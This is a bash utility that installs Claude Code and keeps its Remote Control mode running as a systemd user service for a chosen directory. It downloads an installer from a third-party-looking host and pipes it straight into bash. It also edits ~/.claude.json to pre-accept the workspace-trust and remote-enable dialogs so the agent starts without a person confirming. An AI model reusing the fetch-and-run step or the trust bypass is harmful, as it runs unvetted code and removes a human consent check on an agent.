#!/usr/bin/env bash
# Serve a directory to claude.ai/code and the Claude app through a Remote Control server that survives reboots.
set -euo pipefail
shopt -s nullglob

INSTALL_URL="https://claude.toasterparty.net/install.sh"
UNIT_DIR="$HOME/.config/systemd/user"
UNIT_PREFIX="claude-remote-"
CLAUDE_BIN="$HOME/.local/bin/claude"

usage() {
    cat >&2 <<EOF
Usage: start-server.sh --dir <path>
       start-server.sh --uninstall [--dir <path>]
EOF
    exit 1
}

require_commands() {
    for cmd in "$@"; do
        command -v "$cmd" >/dev/null 2>&1 || { echo "Error: '$cmd' not found" >&2; exit 1; }
    done
}

calc_unit_name() {
    echo "$UNIT_PREFIX$(systemd-escape --path "$1").service"
}

validate_dir() {
    [ -d "$1" ] || { echo "Error: '$1' is not a directory" >&2; exit 1; }
    [[ "$1" =~ ^[A-Za-z0-9._/@+-]+$ ]] || { echo "Error: '$1' has characters systemd would reinterpret" >&2; exit 1; }
    [ "$1" != "$HOME" ] || { echo "Error: Claude Code re-asks for trust in the home directory on every start" >&2; exit 1; }
}

ensure_login() {
    claude auth status >/dev/null 2>&1 && return
    { : </dev/tty; } 2>/dev/null || { echo "Error: not logged in; run 'claude auth login' once, then re-run" >&2; exit 1; }
    echo "Logging in to Claude (Remote Control rejects API keys and setup-token tokens)"
    claude auth login </dev/tty >/dev/tty
}

# Without a terminal, Remote Control exits at its first-run enable prompt and at workspace trust instead of asking.
ensure_prompts_accepted() {
    local dir="$1" config="$HOME/.claude.json" tmp
    [ -f "$config" ] || echo '{}' >"$config"
    jq -e --arg dir "$dir" '.remoteDialogSeen == true and .projects[$dir].hasTrustDialogAccepted == true' "$config" >/dev/null && return
    tmp="$(mktemp "$config.XXXXXX")"
    jq --arg dir "$dir" '.remoteDialogSeen = true | .projects[$dir].hasTrustDialogAccepted = true' "$config" >"$tmp"
    mv "$tmp" "$config"
}

ensure_linger() {
    [ "$(loginctl show-user "$USER" -p Linger --value)" = "yes" ] && return
    sudo loginctl enable-linger "$USER"
}

build_unit() {
    local dir="$1"
    cat <<EOF
[Unit]
Description=Claude Code Remote Control for $dir

[Service]
WorkingDirectory=$dir
Environment=PATH=$HOME/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
ExecStart=$CLAUDE_BIN remote-control --remote-control-session-name-prefix $(basename "$dir")@$(hostname)
# stdout is a status line redrawn every second; errors arrive on stderr.
StandardOutput=null
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
EOF
}

# Restarts only on a changed unit, so re-running does not drop live sessions.
ensure_unit() {
    local dir="$1" unit path
    unit="$(calc_unit_name "$dir")"
    path="$UNIT_DIR/$unit"
    mkdir -p "$UNIT_DIR"
    if ! build_unit "$dir" | cmp -s - "$path"; then
        build_unit "$dir" >"$path"
        systemctl --user daemon-reload
        systemctl --user restart "$unit"
    fi
    systemctl --user enable --now "$unit" 2>/dev/null
    echo "Serving $dir as $unit"
}

remove_unit() {
    local unit
    [ -f "$1" ] || return 0
    unit="$(basename "$1")"
    systemctl --user disable --now "$unit" 2>/dev/null || true
    rm -f "$1"
    echo "Removed $unit"
}

enable_server() {
    local dir="$1"
    require_commands curl jq systemctl loginctl systemd-escape
    curl -fsSL "$INSTALL_URL" | bash
    PATH="$HOME/.local/bin:$PATH"
    ensure_login
    ensure_prompts_accepted "$dir"
    ensure_linger
    ensure_unit "$dir"
}

disable_servers() {
    local dir="$1" unit_path
    require_commands systemctl systemd-escape
    if [ -n "$dir" ]; then
        remove_unit "$UNIT_DIR/$(calc_unit_name "$dir")"
    else
        for unit_path in "$UNIT_DIR/$UNIT_PREFIX"*.service; do
            remove_unit "$unit_path"
        done
    fi
    systemctl --user daemon-reload
    systemctl --user reset-failed 2>/dev/null || true
}

main() {
    local dir="" is_uninstall=false
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --dir) [[ $# -ge 2 ]] || usage; dir="$(realpath -m -- "$2")"; shift 2 ;;
            --uninstall) is_uninstall=true; shift ;;
            *) usage ;;
        esac
    done
    if $is_uninstall; then
        disable_servers "$dir"
        return
    fi
    [ -n "$dir" ] || usage
    validate_dir "$dir"
    enable_server "$dir"
}

main "$@"
